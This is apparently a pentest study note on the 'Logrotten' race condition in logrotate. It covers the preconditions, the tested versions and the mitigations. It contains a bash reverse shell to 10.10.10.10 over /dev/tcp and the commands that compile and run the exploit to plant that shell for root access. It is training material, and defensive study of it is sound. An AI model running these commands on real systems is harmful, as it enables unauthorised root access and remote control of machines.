# Logrotten

`logrotate` is used in manage logging for Linux - [[Linux-Logging]].  Unfortunately, `logrotate` is prone to a race condition after renaming the log file:
- If logrotate is executed as root, with option that creates a file ( like create, copy, compress, etc.) and the user is in control of the log file path, it is possible to abuse a race-condition to write files in ANY directories.
- An attacker could elevate his privileges by writing reverse-shells into directories like `/etc/bash_completion.d/`.

[GitHub - Whotwagner: Logrotten exploit](https://github.com/whotwagner/logrotten)
Precondition for privilege escalation
-  `logrotate` has to be executed as root
- The `LOGPATH` needs to be in control of the attacker
- Any option that creates files is set in the `logrotate` configuration

Tested versions
- Debian GNU/Linux 11 (bullseye)
- Debian GNU/Linux 9.5 (stretch)
- Amazon Linux 2 AMI (HVM)
- Ubuntu 18.04.1
- `logrotate` 3.8.6
- `logrotate` 3.11.0
- `logrotate` 3.15.0
- `logrotate` 3.18.0

rev_shell.sh
```bash
#!/bin/bash

bash -i >& /dev/tcp/10.10.10.10/8443 0>&1 
```
Compile, `chmod` and execute
```bash
gcc -o logrotten logrotten.c 
chmod +x rev_shell.sh logrotten
echo pwn >> /home/reader/backups/access.log; ./logrotten /home/reader/backups/access.log -p rev_shell.sh 
```

#### Mitigation:

- make sure that `LOGPATH` is owned by root
- use option "`su`" in `logrotate.cfg`
- use `selinux` or `apparmor`

## References

[HTB Academy Logrotate](https://academy.hackthebox.com)
[GitHub - Whotwagner: Logrotten exploit](https://github.com/whotwagner/logrotten), references:
- [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition) - deadlink
- [https://tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges](https://tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges)
- [https://github.com/whotwagner/logrotten](https://github.com/whotwagner/logrotten)
- [https://www.ait.ac.at/themen/cyber-security/ait-sa-20190930-01/](https://www.ait.ac.at/themen/cyber-security/ait-sa-20190930-01/)
- [https://tech.feedyourhead.at/content/privilege-escalation-in-groonga-httpd](https://tech.feedyourhead.at/content/privilege-escalation-in-groonga-httpd)